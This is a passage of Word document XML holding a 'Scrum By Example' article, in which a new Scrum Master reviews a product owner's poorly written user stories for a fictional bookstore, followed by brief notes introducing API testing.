            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E432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 will update you regarding the burn down chart and daily scrum meeting in my next post.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00B84F48" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:caps/>
          <w:color w:val="004E96"/>
          <w:sz w:val="54"/>
          <w:szCs w:val="54"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId181" w:history="1">
        <w:r w:rsidR="00376849">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
            <w:caps/>
            <w:color w:val="336699"/>
            <w:sz w:val="54"/>
            <w:szCs w:val="54"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>SCRUM BY EXAMPLE</w:t>
        </w:r>
      </w:hyperlink>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p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">I’ve been struck by how little is written about being a great Scrum Master. There have been a stack of articles written about Scaling Agile and many great technical books, but very little on playing individual roles well. Scrum </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>By</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Example is intend to fill this gap.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Cast of Characters</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Scrum Master John</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> – he’s been in the software industry for over 10 yrs. He’s been a developer and sometime development manager. Recently he’s been “promoted” to Scrum Master and was sent on a </w:t>
      </w:r>
      <w:hyperlink r:id="rId182" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:eastAsiaTheme="majorEastAsia" w:hAnsi="inherit"/>
            <w:color w:val="336699"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Certified Scrum Master Training</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> course, but has no practical Scrum experience.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Product Owner Sue – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">she’s also new to Agile. Unfortunately she hasn’t had training yet, although she has read a few books. She’s open-minded, but a little confused about what needs to be done. Sue has 15 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>years expe</w:t>
      </w:r>
      <w:r w:rsidR="00675571">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>rience</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00675571">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> doing Product Management</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00675571" w:rsidRDefault="00675571" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="225" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="004E96"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="004E96"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>The Application</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Smallestonlinebookstore.com caters to the view that Amazon is wrong; an infinite supply of books is too much. Readers don’t want an infinite supply</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>;  just</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> the right choice for their next book. They don’t want to spend hours agonizing over their </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>decision,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> instead they want to spend that time reading.</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I will introduce other characters as the tales evolve, but now, onto our first story:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="225" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="004E96"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="004E96"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>Story</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John is preparing for tomorrow’s Sprint Planning session. He asks Sue to show him the product backlog. She sends him a spreadsheet; and, boom! He’s surprised at how poorly the written the User Stories are:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="210"/>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As a user I want to search Smallestonlinebookstore.com to find some books</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="210"/>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As a user I want to buy the book that I’m currently looking at</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="210"/>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As a user I want to search using the author’s  first and last name fields along with the title field</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="210"/>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John panics and his jaw drops; he thinks the team can’t possibly have a Sprint Planning meeting tomorrow.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="225" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="004E96"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="004E96"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>Analysis</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What problems do we face here?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="211"/>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The stories are very broad and too large to complete in a single Sprint. To be useful stories must be specific and focused. A great user story is so small it can be implemented in 2-3 days.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="211"/>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The stories have generic users, while good user stories have specific users.</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Example: Frequent Book Buyer; Casual Book Buyer.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="212"/>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They lack value and “Why?” statements. Good user stories have “so that” statements that make the value of the story clear to the team.</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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Example: “As a user I want to search using the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>author’s  first</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> and last name fields along with the title field”  the story is very specific about the implementation. It ties the team member’s hands</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>  without</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> adding significant value.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="213"/>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None of the stories have estimates associated with them.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="213"/>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It’s the day before the Sprint Planning meeting and only now is John is discovering the problem.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00675571" w:rsidRDefault="00675571" w:rsidP="00675571">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="225" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="004E96"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="004E96"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>Options</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So what options does John have?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="214"/>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He could work for the rest of the day with Sue to rewrite and </w:t>
      </w:r>
      <w:hyperlink r:id="rId183" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
            <w:color w:val="336699"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>split the stories</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> but that still wouldn’t get the stories estimated.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="214"/>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He could cancel the Sprint Planning session and delay the start of the Sprint. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>The backlog is ill- prepared but Sue is new to Agile and appears to be trying to do the right thing. Cancelling Sprint Planning is an extremely strong signal to send at this stage of the game.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="214"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>He could turn tomorrow’s Sprint Planning meeting into a </w:t>
      </w:r>
      <w:hyperlink r:id="rId184" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
            <w:color w:val="336699"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Backlog Grooming</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> (to rewrite and estimate the stories). After that’s completed he could hold a traditional Sprint Planning meeting. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>This seems like the best option, but…</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 </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Before he takes any action John should sit down with Sue and discuss the problems he sees, all the while making the focus not on the mistakes Sue has made but instead focusing on the backlog and what a good story would be. Then he should explain the current state of the world to the team, including all the options that they have and let the team decide what to do. Even if they make what John perceives to be a weaker decision they will learn from the mistake and grow.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="00376849">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="300" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="3D3D3D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>What options did you consider for John? What could he do differently?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00376849" w:rsidRDefault="00376849" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E54CA0" w:rsidRDefault="00E54CA0" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:r>
        <w:t xml:space="preserve">What is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>API</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:r>
        <w:t xml:space="preserve"> Benefit of API</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:r>
        <w:t>How to Test</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:r w:rsidRPr="00664893">
        <w:t>https://smartbear.com/learn/api-testing/what-is-api-testing/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:r>
        <w:t>&gt;&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1) What is an API?</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 xml:space="preserve">API is a contract. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>A promise to perform described services when asked in specific ways.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
